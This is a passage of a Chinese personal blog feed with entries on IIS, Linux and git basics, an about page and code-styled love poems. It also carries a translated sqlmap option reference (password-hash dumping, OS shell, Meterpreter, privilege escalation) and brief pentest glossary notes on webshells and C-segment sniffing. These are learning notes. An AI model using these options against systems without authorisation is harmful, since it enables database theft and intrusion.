src="images/20190515091-1-300x236.jpg"></p><p>网站未找到默认文档报错</p><p>但是如果打<a href="http://localhost:8080/Default.aspx">http://localhost:8080/Default.aspx</a> 又可以访问了，这是因为：IIS默认的默认文档为以下几个：Default.htm、Default.asp、index.htm、 index.html、iisstart.htm、default.aspx（在此说明一下，由于Windows系统在路径上不区分大小写，所以IIS上 发布的网站也是不区分大小写的），如果你的主页文件不在上述文件之内，不输文档名，默认是无法访问到的（这里我故意删除了Default.aspx），所 以，针对这种情况，请自行设置默认文档，添加默认文档以后，直接敲域名或者IP及端口号即可方法默认页面了</p><p>/*************************************</p><p>今天太晚了，明天继续更新</p><p>**************************************/</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLMAP 命令详解</title>
    <link href="/2019/05/29/sqlmap-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/index/"/>
    <url>/2019/05/29/sqlmap-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/index/</url>
    
    <content type="html"><![CDATA[<p>Options（选项）： –version 显示程序的版本号并退出 -h, –help 显示此帮助消息并退出 -v VERBOSE 详细级别：0-6（默认为 1） Target（目标）： 以下至少需要设置其中一个选项，设置目标 URL。 -d DIRECT 直接连接到数据库。 -u URL, –url=URL 目标 URL。 -l LIST 从 Burp 或 WebScarab 代理的日志中解析目标。 -r REQUESTFILE 从一个文件中载入 HTTP 请求。 -g GOOGLEDORK 处理 Google dork 的结果作为目标 URL。 -c CONFIGFILE 从 INI 配置文件中加载选项。 Request（请求）：: 这些选项可以用来指定如何连接到目标 URL。 –data=DATA 通过 POST 发送的数据字符串 –cookie=COOKIE HTTP Cookie 头 –cookie-urlencode URL 编码生成的 cookie 注入 –drop-set-cookie 忽略响应的 Set - Cookie 头信息</p><p>--user-agent=AGENT 指定 HTTP User - Agent 头</p><p>--random-agent 使用随机选定的 HTTP User - Agent 头 –referer=REFERER 指定 HTTP Referer 头 –headers=HEADERS 换行分开，加入其他的 HTTP 头 –auth-type=ATYPE HTTP 身份验证类型（基本，摘要或 NTLM）(Basic, Digest or NTLM) –auth-cred=ACRED HTTP 身份验证凭据（用户名:密码） –auth-cert=ACERT HTTP 认证证书（key_file，cert_file） –proxy=PROXY 使用 HTTP 代理连接到目标 URL –proxy-cred=PCRED HTTP 代理身份验证凭据（用户名：密码） –ignore-proxy 忽略系统默认的 HTTP 代理 –delay=DELAY 在每个 HTTP 请求之间的延迟时间，单位为秒 –timeout=TIMEOUT 等待连接超时的时间（默认为 30 秒） –retries=RETRIES 连接超时后重新连接的时间（默认 3） –scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式 –safe-url=SAFURL 在测试过程中经常访问的 url 地址 –safe-freq=SAFREQ 两次访问之间测试请求，给出安全的 URL Optimization（优化）： 这些选项可用于优化 SqlMap 的性能。 -o 开启所有优化开关 –predict-output 预测常见的查询输出 –keep-alive 使用持久的 HTTP（S）连接 –null-connection 从没有实际的 HTTP 响应体中检索页面长度 –threads=THREADS 最大的 HTTP（S）请求并发量（默认为 1） Injection（注入）： 这些选项可以用来指定测试哪些参数， 提供自定义的注入 payloads 和可选篡改脚本。 -p TESTPARAMETER 可测试的参数（S） –dbms=DBMS 强制后端的 DBMS 为此值 –os=OS 强制后端的 DBMS 操作系统为这个值 –prefix=PREFIX 注入 payload 字符串前缀 –suffix=SUFFIX 注入 payload 字符串后缀 –tamper=TAMPER 使用给定的脚本（S）篡改注入数据 Detection（检测）： 这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容。 –level=LEVEL 执行测试的等级（1-5，默认为 1） –risk=RISK 执行测试的风险（0-3，默认为 1） –string=STRING 查询时有效时在页面匹配字符串 –regexp=REGEXP 查询时有效时在页面匹配正则表达式 –text-only 仅基于在文本内容比较网页 Techniques（技巧）： 这些选项可用于调整具体的 SQL 注入测试。 –technique=TECH SQL 注入技术测试（默认 BEUST） –time-sec=TIMESEC DBMS 响应的延迟时间（默认为 5 秒） –union-cols=UCOLS 定列范围用于测试 UNION 查询注入 –union-char=UCHAR 用于暴力猜解列数的字符 Fingerprint（指纹）： -f, –fingerprint 执行检查广泛的 DBMS 版本指纹 Enumeration（枚举）：</p><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己 的 SQL 语句。 -b, –banner 检索数据库管理系统的标识 –current-user 检索数据库管理系统当前用户 –current-db 检索数据库管理系统当前数据库 –is-dba 检测 DBMS 当前用户是否 DBA –users 枚举数据库管理系统用户 –passwords 枚举数据库管理系统用户密码哈希 –privileges 枚举数据库管理系统用户的权限 –roles 枚举数据库管理系统用户的角色 –dbs 枚举数据库管理系统数据库 –tables 枚举的 DBMS 数据库中的表 –columns 枚举 DBMS 数据库表列 –dump 转储数据库管理系统的数据库中的表项 –dump-all 转储所有的 DBMS 数据库表中的条目 –search 搜索列（S），表（S）和/或数据库名称（S） -D DB 要进行枚举的数据库名 -T TBL 要进行枚举的数据库表 -C COL 要进行枚举的数据库列 -U USER 用来进行枚举的数据库用户 –exclude-sysdbs 枚举表时排除系统数据库 –start=LIMITSTART 第一个查询输出进入检索 –stop=LIMITSTOP 最后查询的输出进入检索 –first=FIRSTCHAR 第一个查询输出字的字符检索 –last=LASTCHAR 最后查询的输出字字符检索 –sql-query=QUERY 要执行的 SQL 语句 –sql-shell 提示交互式 SQL 的 shell Brute force（蛮力）： 这些选项可以被用来运行蛮力检查。 –common-tables 检查存在共同表 –common-columns 检查存在共同列 User-defined function injection（用户自定义函数注入）： 这些选项可以用来创建用户自定义函数。 –udf-inject 注入用户自定义函数 –shared-lib=SHLIB 共享库的本地路径 File system access（访问文件系统）： 这些选项可以被用来访问后端数据库管理系统的底层文件系统。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）： 这些选项可以用于访问后端数据库管理系统的底层操作系统。 –os-cmd=OSCMD 执行操作系统命令 –os-shell 交互式的操作系统的 shell –os-pwn 获取一个 OOB shell，meterpreter 或 VNC –os-smbrelay 一键获取一个 OOB shell，meterpreter 或 VNC –os-bof 存储过程缓冲区溢出利用 –priv-esc 数据库进程用户权限提升 –msf-path=MSFPATH Metasploit Framework 本地的安装路径 –tmp-path=TMPPATH 远程临时文件目录的绝对路径</p><p>Windows 注册表访问： 这些选项可以被用来访问后端数据库管理系统 Windows 注册表。 –reg-read 读一个 Windows 注册表项值 –reg-add 写一个 Windows 注册表项值数据 –reg-del 删除 Windows 注册表键值 –reg-key=REGKEY Windows 注册表键 –reg-value=REGVAL Windows 注册表项值 –reg-data=REGDATA Windows 注册表键值数据 –reg-type=REGTYPE Windows 注册表项值类型 General（一般）：</p><p>这些选项可以用来设置一些一般的工作参数。 -t TRAFFICFILE 记录所有 HTTP 流量到一个文本文件中 -s SESSIONFILE 保存和恢复检索会话文件的所有数据 –flush-session 刷新当前目标的会话文件 –fresh-queries 忽略在会话文件中存储的查询结果 –eta 显示每个输出的预计到达时间 –update 更新 SqlMap –save file 保存选项到 INI 配置文件 –batch 从不询问用户输入，使用所有默认配置。 Miscellaneous（杂项）： –beep 发现 SQL 注入时提醒 –check-payload IDS 对注入 payloads 的检测测试 –cleanup SqlMap 具体的 UDF 和表清理 DBMS –forms 对目标 URL 的解析和测试形式 –gpage=GOOGLEPAGE 从指定的页码使用谷歌 dork 结果 –page-rank Google dork 结果显示网页排名（PR） –parse-errors 从响应页面解析数据库管理系统的错误消息 –replicate 复制转储的数据到一个 sqlite3 数据库 –tor 使用默认的 Tor（Vidalia/ Privoxy/ Polipo）代理地址 –wizard 给初级用户的简单向导界面</p><p>嗯。。。哪里不对的，请指正，谢谢</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>三行情书</title>
    <link href="/2019/05/20/%E4%B8%89%E8%A1%8C%E6%83%85%E4%B9%A6/index/"/>
    <url>/2019/05/20/%E4%B8%89%E8%A1%8C%E6%83%85%E4%B9%A6/index/</url>
    
    <content type="html"><![CDATA[<p>if(you.hand==cold&amp;&weather;=winter)</p><p>//如果冬天里你的手是冰冷的</p><p>giveyoulove(myhand.temp,yourhand.temp);</p><p>//将我手上的温度全部给予你</p><p>return you.happyface;</p><p>//换取你幸福的脸庞</p><p> </p><p>if(you.Love(&amp;me)||!you.love(&amp;me)){</p><p>//你爱或者不爱我</p><p>me.emotion.love.value ++;</p><p>//爱就在那里</p><p>me.emotion.love.value –;}</p><p>//不增不减</p><p> </p><p>if（house＝＝The Potala stands）</p><p>//住进布达拉宫，</p><p>me＝“King of the snowfield”;</p><p>//我是雪域最大的王；</p><p>else me＝“the best lover”;</p><p>//流浪在拉萨街头，我是世间最美的情郎。</p><p> </p><p>try</p><p>//生活中总是出现这样那样的意外</p><p>catch(Exception e)</p><p>//只要我们携手共同面对</p><p>finally</p><p>//最终只会让我们爱的更深</p><p> </p><p>oreach(var you in worlds){</p><p>//遍历整个世界，只为找到你.</p><p>if(you==”myLove”)</p><p>//当我发现你是我的真爱时,</p><p>myHeart[“myWife”]==you; }</p><p>//那么你就是我要找寻的人，我的妻子</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>表白网页</title>
    <link href="/2019/05/20/%E8%A1%A8%E7%99%BD%E7%BD%91%E9%A1%B5/index/"/>
    <url>/2019/05/20/%E8%A1%A8%E7%99%BD%E7%BD%91%E9%A1%B5/index/</url>
    
    <content type="html"><![CDATA[<p><a href="http://qtbk.xyz/%20Confession/%20ConfessionTwo/">表白1</a> <a href="http://qtbk.xyz/%20Confession/%20ConfessionThree/">表白2</a></p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于</title>
    <link href="/2019/05/19/%E5%85%B3%E4%BA%8E/index/"/>
    <url>/2019/05/19/%E5%85%B3%E4%BA%8E/index/</url>
    
    <content type="html"><![CDATA[<p>自动播放的背景音乐在这<strong>↑</strong>（懒得做兼容了，好使得就自动播放，不好使的自己点吧），可以自己关</p><p>         简单地说，来自于内蒙古的一个程序猿???<a href="http://qtbk.xyz/?p=72">关于这个站以及我请点这里，</a></p><p>再简单的做个自我介绍吧：</p><p>        游戏只玩俩，球球大作战超神，穿越火线差一颗星到枪王，能弹吉他，会跳舞（n久不跳了基本上不会了），可高冷可卖萌，会打篮球，踢足球那种运动不适合我，太危险了。en。。。母胎solo，期望找个女朋友，要求嘛，女的、活的。。。</p><p>嗯。。。就这样，联系我请点左上角的三个横杠，里面有qq（微信同步），电话，邮箱（别问我为什么不在这再弄一遍，懒。。。）</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>QT的第一篇博客</title>
    <link href="/2019/05/17/qt%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/index/"/>
    <url>/2019/05/17/qt%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/index/</url>
    
    <content type="html"><![CDATA[<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>一个学渣？？？应该不算吧，毕竟我也是我们村的第一个考上二本的大学生呢（haha）。嗯。。。这么形容吧，一个偶尔臭美偶尔扯淡的、正在努力的、特想发财的普通二本大学生（haha）。<a href="http://qtbk.xyz/?p=183">也可看这</a></p><h2 id="写博客的原因"><a href="#写博客的原因" class="headerlink" title="写博客的原因"></a>写博客的原因</h2><p>其实，之前一直有写博客的冲动，在博客园和csdn上也写过几篇，但是反响平平（？？文笔不好嘛，还是太小白了，亦或是布局不好么，不知道）。上了大学开始学习计算机之后基本都是用电脑百度着百度那，查到看完就把页面一关就万事大吉。导致之后每次碰到同样的问题都是记得以前看过同样的问题，但就是想不起来只能重新查一遍，真真真真的痛苦。之后通过上网发现自己需要好好对知识点进行一个归纳总结。一是方便以后碰到同样的问题好查阅，二来在写博客的同时也加深了自己对知识点的理解。</p><h2 id="关于内容"><a href="#关于内容" class="headerlink" title="关于内容"></a>关于内容</h2><p>主要自己想记录一些平时学到的内容，同时可能还会记录一些自己的生活感想什么的，就当写日记了吧。由于学的比较乱、比较杂，所以可能小白的知识多一些，内容相对较少，可能后面会有总结会把之前的小的知识点汇总一下。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>嗯。。。我觉得吧，写博客可以当做一个积累的过程，也是自己努力过后的一个回报，加油！QT，你一定能行的，fighting！！！！</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用vps安装宝塔+wordpress搭建个人博客遇到的一系列问题</title>
    <link href="/2019/05/16/%E4%BD%BF%E7%94%A8vps%E5%AE%89%E8%A3%85%E5%AE%9D%E5%A1%94wordpress%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98/index/"/>
    <url>/2019/05/16/%E4%BD%BF%E7%94%A8vps%E5%AE%89%E8%A3%85%E5%AE%9D%E5%A1%94wordpress%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98/index/</url>
    
    <content type="html"><![CDATA[<p>1.安装：请参考<a href="http://docs.bt.cn/443922">http://docs.bt.cn/443922</a></p><p>2.dpkg was interrupted, you must manually run ‘dpkg –configure -a’ to correct the problem. E: _cache-&gt;open() failed, please report.</p><p>sudo dpkg --configure -a</p><p>3.安装时出现psutil installation failed.错误</p><p>cent os：</p><p>1. yum clean all<br>2. yum makecache<br>3. yum -y install gcc</p><p>debian将yum换为apt-get即可</p><p>4.Your server is running PHP version 5.4.45 but WordPress 5.2 requires at least 5.6.20.</p><p>php版本过低，安装高版本</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试笔记</title>
    <link href="/2019/04/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/index/"/>
    <url>/2019/04/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/index/</url>
    
    <content type="html"><![CDATA[<p>例如织梦，20位md5，前去三后去一</p><p>小马，用来上传大马</p><p>提权</p><p>webshell,网站后门</p><p>poc：proof of concept ：漏洞的概念证明 <br>vul：vulnerable：漏洞 <br>exp：exploit:漏洞利用，一般是个demo程序</p><p>旁站入侵</p><p>即同服务器下的网站入侵，入侵后可通过提权跨目录等手段拿到目标网站的权限。</p><p>c段入侵</p><p>即同c段服务器入侵，如目标为192.168.1.253，入侵192.168.1.*的任意一台机器，然后利用嗅探获取网络上传输的各种信息。常用工具：windows：cain，unix：sniffit、snoop、tcpdump、dsniff等</p><p>黑盒测试</p><p>未经授权情况下，模拟黑客攻击方法和思维评估计算机网络系统可能存在的安全风险</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>马哥运维笔记</title>
    <link href="/2019/04/08/%E9%A9%AC%E5%93%A5%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/index/"/>
    <url>/2019/04/08/%E9%A9%AC%E5%93%A5%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/index/</url>
    
    <content type="html"><![CDATA[<p>Kernel：内核</p><p>Library：API</p><p>shell  ：GUI（图形界面） 以及（CLI命令行）</p><p>Linux基本原则：</p><ol><li>由目的单一的小程序组成：组成小程序完成复杂任务</li><li>一切皆文件</li><li>尽量避免捕捉用户接口</li><li>配置文件保存为纯文本格式</li></ol><p>GUI接口：</p><p>CLI接口：</p><p>   命令提示符，prompt，bash（shell）</p><p>      #：root</p><p>      $：普通用户</p><p>   命令：</p><p>  命令格式：</p><p>  命令  选项（用来修正命令执行方式） 参数</p><p>     选项：</p><p>        短选项：-</p><p>         一般而言，多个选择可以组合：-a –b=-ab</p><p>        长选项：–</p><p>          通常不能组合</p><p>        参数：命令的作用对象（有多个参数，彼此之前用空格隔开）</p><p>使用凭证：</p><p>Linux严格区分大小写。</p><p>虚拟终端（terminal）：ctrl+alt+f1~6</p><p>Shell：</p><p>GUI（图形用户界面 Graphics User Interface）：</p><p>   Windows</p><p>X-Windows</p><p>      Gnome：C</p><p>KDE:C++</p><p>XFace</p><p>CLI（命令行接口Command Line Interface）:</p><p>bash （功能最强大，学习这个）</p><p>csh</p><p>zsh</p><p>ksh</p><p>tcsh</p><p>假设有三个用户：root student vistor</p><p>用户切换</p><p>su:switch user</p><p>#su [-1]  用户名</p><p>#passwd 用于修改当前用户的密码（敲两次即可）</p><p>密码复杂性规则：</p><p>数字，大写字母，小写字母，字符选其三</p><p>即足够复杂并且足够长（大于7位），尽量使用随机字符串，要定期更换，循环周期要足够大（即尽量不要使用原来使用过的密码）</p><p>login：</p><p>  用户名：用户ID</p><p>认证机制（Authentication）</p><p>授权（Authorrization）</p><p>审计（Audition）（日志）</p><p>prompt，命令提示符：</p><p>命令：</p><p>magic number：魔数</p><p>shebang</p><p>#！/bin/bash</p><p>#command options… arguments…</p><p>ls：list</p><p>目录：文件，路径映射</p><p>路径:从指定起始点到目的地所经过的位置</p><p>列出指定路径下的所有文件</p><p>目录：working directory，current directory</p><p>pwd：Printing working directory</p><p>ls</p><p>   -l：长格式</p><p>       文件类型：</p><p>         -：普通文件</p><p>         d：目录文件</p><p>         b：块设备文件</p><p>         c：字条设备文件（symbol）</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>git笔记</title>
    <link href="/2019/04/02/git%E7%AC%94%E8%AE%B0/index/"/>
    <url>/2019/04/02/git%E7%AC%94%E8%AE%B0/index/</url>
    
    <content type="html"><![CDATA[<p>暂无</p>]]></content>
    
    
    <categories>
      
      <category>版本控制</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GitHub搭建个人博客的一系列问题</title>
    <link href="/2019/04/02/github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98/index/"/>
    <url>/2019/04/02/github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98/index/</url>
    
    <content type="html"><![CDATA[<p>正在安装，随后一起</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux笔记</title>
    <link href="/2019/04/02/linux%E7%AC%94%E8%AE%B0/index/"/>
    <url>/2019/04/02/linux%E7%AC%94%E8%AE%B0/index/</url>
    
    <content type="html"><![CDATA[<p>1.安装 Install or upgrade an existing system 安装或升级现有的系统 install system with basic video driver 安装过程中采用基本的显卡驱动 Rescue installed system 进入系统修复模式 Boot from local drive 退出安装从硬盘启动 Memory test 内存检测</p><p>2.图形模式与文字模式的切换方式 inux预设提供了六个命令窗口终端机让我们来登录。 默认我们登录的就是第一个窗口，也就是tty1，这个六个窗口分别为tty1,tty2 … tty6，你可以按下Ctrl + Alt + F1 ~ F6 来切换它们。 如果你安装了图形界面，默认情况下是进入图形界面的，此时你就可以按Ctrl + Alt + F1 ~ F6来进入其中一个命令窗口界面。 当你进入命令窗口界面后再返回图形界面只要按下Ctrl + Alt + F7 就回来了。 如果你用的vmware 虚拟机，命令窗口切换的快捷键为 Alt + Space + F1<del>F6. 如果你在图形界面下请按Alt + Shift + Ctrl + F1</del>F6 切换至命令窗口。</p><p>3.Linux 关机 sync 将数据由内存同步到硬盘中。 shutdown 关机指令，你可以man shutdown 来看一下帮助文档。例如你可以运行如下命令关机： shutdown –h 10 ‘This server will shutdown after 10 mins’ 这个命令告诉大家，计算机将在10分钟后关机，并且会显示在登陆用户的当前屏幕中。 shutdown –h now 立马关机 shutdown –h 20:25 系统会在今天20:25关机 shutdown –h +10 十分钟后关机 shutdown –r now 系统立马重启 shutdown –r +10 系统十分钟后重启 reboot 就是重启，等同于 shutdown –r now halt 关闭系统，等同于shutdown –h now 和 poweroff 不管是重启系统还是关闭系统，首先要运行 sync 命令，把内存中的数据写到磁盘中。 关机补充命令 # shutdown -p now ### 关闭机器 # shutdown -H now ### 停止机器 # shutdown -r09:35 ### 在 09:35am 重启机器 要取消即将进行的关机，只要输入下面的命令： # shutdown -c halt 命令通知硬件来停止所有的 CPU 功能，但是仍然保持通电。你可以用它使系统处于低层维护状态。注意在有些情况会它会完全关闭系统。 # halt ### 停止机器 # halt -p ### 关闭机器 # halt –reboot ### 重启机器 poweroff 会发送一个 ACPI 信号来通知系统关机。 # poweroff ### 关闭机器 # poweroff –halt ### 停止机器 # poweroff –reboot ### 重启机器 reboot 命令 reboot 通知系统重启。 # reboot ### 重启机器 # reboot –halt ### 停止机器 # reboot -p ### 关闭机器 [Tab] 有『命令补全』与『文件补齐』的功能 [Tab] ## 接在一串指令的第一个字的后面，则为『命令补全』 [Tab] ## 接在一串指令的第二个字以后时，则为『文件补齐』 若安装 bash-completion 软件，则在某些指令后面使用 [tab] 按键时，可以进行『选项/参数的补齐』功能！ [Ctrl]+ C 如果在Linux 底下输入了错误的指令或参数，想让当前的程序『停掉』的话，可以输入： [Ctrl] + c [Ctrl]-d 『键盘输入结束(End Of File, EOF 或 End Of Input)』的意思 另外，他也可以用来取代 exit 的输入。 例如你想要直接离开文字接口，可以直接按下： [Ctrl] + d ## 相当于输入 exit [shift]+{[PageUP]|[Page Down]} [Shift]+[Page Up] ## 往前翻页 [Shift]+[Page Down] ## 往后翻页 4.目录解释 /bin： bin是Binary的缩写, 这个目录存放着最经常使用的命令。#binary 二进制 /boot： 这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。 /dev ： dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /etc： 这个目录用来存放所有的系统管理所需要的配置文件和子目录。 /home： 用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。 /lib： 这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。 /lost+found： 这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。 /media： linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。 /mnt： 系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。 /opt： 这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。 /proc： 这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。 这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器： echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all /root： 该目录为系统管理员，也称作超级权限者的用户主目录。 /sbin： s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。 /selinux： 这个目录是Redhat/CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。 /srv： 该目录存放一些服务启动之后需要提取的数据。 /sys： 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。 sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统。 该文件系统是内核设备树的一个直观反映。 当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。 /tmp： 这个目录是用来存放一些临时文件的。 /usr： 这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。 /usr/bin： 系统用户使用的应用程序。 /usr/sbin： 超级用户使用的比较高级的管理程序和系统守护程序。 /usr/src： 内核源代码默认的放置目录。 /var： 这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 /run： 是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。 命令行编辑辅助操作： tab，自动补全 反斜杠\强制换行 ctrl+u清空至行首 ctrl+k清空至行尾 ctrl+l清屏 ctrl+c取消本次命令编辑 uname -r查看版本号，详细查询用uname -a hostname 查看主机名 ifconfig查看网卡信息 cat /proc/cpuinfo查看cpu信息 cat /proc/meminfo pwd查看路径信息 du 统计目录及文件的空间占用情况 mkdir [-p] [/路径/] 目录名，加-p是递归创建 touch [-s]源文件或目录 目标文件或目录 ，新建文件或者更新时间标记加-s是快捷方式，不加s相当于复制一下 cp [选项] 源文件或目录 目标文件或目录复制文件或目录，-r递归复制整个目录树，-p保持源文件的属性不变，-f强制覆盖目标同文件或目录，-i需要覆盖文件1或目录时进行提醒 rm [选项]目标文件或文件夹，删除文件或目录，-f强制删除文件或目录不进行提醒，-i删除文件或目录时提醒用户确认，-r递归删除整个目录树 mv [选项] 源文件或目录 目标文件或目录 ，移动文件或目录，如果目标位置与原位置相同，则相当于改名 find [查找范围] [查找] vi [-options] [+[n]] [file],-r用于恢复系统突然崩溃时正在编辑的文件，-R用于只读方式打开文件，+n用来指明进入vi后位于文件第几行，不指定则位于最后一行 vi编辑选项（在命令方式下）：a在光标后附加文本，A在本行行末附加文本，i在光标前插入文本，I在本行开始插入文本，o在光标下插入新行，O在光标上插入新行，dd剪切一行，p粘贴，显示行号：set nu（进入命令模式shift+：），w保存，q退出</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows环境npm无法生效</title>
    <link href="/2019/04/02/windows%E7%8E%AF%E5%A2%83npm%E6%97%A0%E6%B3%95%E7%94%9F%E6%95%88/index/"/>
    <url>/2019/04/02/windows%E7%8E%AF%E5%A2%83npm%E6%97%A0%E6%B3%95%E7%94%9F%E6%95%88/index/</url>
    
    <content type="html"><![CDATA[<p>上网查询得知安装完nodejs之后配置windows环境变量只能保证在命令行工具中可以使用npm，如果想在git bash中使用需要再安装一遍 安装后记得配置环境变量</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>git报错</title>
    <link href="/2019/04/01/git%E6%8A%A5%E9%94%99/index/"/>
    <url>/2019/04/01/git%E6%8A%A5%E9%94%99/index/</url>
    
    <content type="html"><![CDATA[<p>-Initial commit Untracked files nothing added to commit but untracked 代码并没有被成功提交，看信息是文件没有被tracked git commit -a -m “提交信息”与 git add + git commit -m “提交信息”,不完全一样 git commit -a -m “提交信息”只将被tracked的文件添加到暂存区并提交，而将文件添加到git管理是要git add命令的， 而直接使用`git commit -a -m “提交信息”命令idea帮做了这一步，自动将文件tracked了。 新建了文件之后，idea会提示： 我肯定某次选择了记住，之后idea默认都会帮我把新建的文件tracked化。 所以初次提交，还是要分别使用： 解决方法，重新提交一次</p><p>error: key does not contain a section: –global 两个–连接在一起，不是一个 若执行ssh-add /path/to/xxx.pem是出现这个错误:Could not open a connection to your authentication agent，则先执行如下命令即可： ssh-agent bash Repository not found。fatal: Could not read from remote repository. 参考：<a href="https://youcanping.cn/2017/12/20/ssh-Permission-denied/">https://youcanping.cn/2017/12/20/ssh-Permission-denied/</a></p><p>bash: echo: command not found windows版本的git不自带make，gcc之类的工具。需要另外下载安装MinGW</p>]]></content>
    
    
    <categories>
      
      <category>版本控制</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>git使用</title>
    <link href="/2019/04/01/git%E4%BD%BF%E7%94%A8/index/"/>
    <url>/2019/04/01/git%E4%BD%BF%E7%94%A8/index/</url>
    
    <content type="html"><![CDATA[<p>1.创建新仓库 创建新文件夹，打开，然后执行 git init 以创建新的 git 仓库 2.创建克隆仓库 执行创建一个本地仓库的克隆版本命令： git clone /path/to/repository 如果是远端服务器上的仓库 git clone username@host:/path/to/repository 3.工作流 你的本地仓库由 git 维护的三棵“树”组成。 第一个是你的 工作目录，它持有实际文件； 第二个是 暂存区（Index），临时保存改动； 最后是 HEAD，指向你最后一次提交的结果。 4.添加和提交 提出更改（把它们添加到暂存区），使用命令： git add git add * 这是 git 基本工作流程的第一步； 使用如下命令以实际提交改动： git commit -m “代码提交信息” 现在改动已经提交到了 HEAD，但是还没到远端仓库。 5.推送改动 改动现在已经在本地仓库的 HEAD 中。执行如下命令以将这些改动提交到远端仓库： git push origin AnyBranch 如果还没有克隆现有仓库，并欲将仓库连接到某个远程服务器，添加命令： git remote add origin 如此你就能够将你的改动推送到所添加的服务器上去了 6.分支 分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是“默认的”分支。在其他分支上进行开发，完成后再将它们合并到主分支上。 创建一个叫做“feature_x”的分支，并切换过去： git checkout -b feature_x 切换回主分支： git checkout master 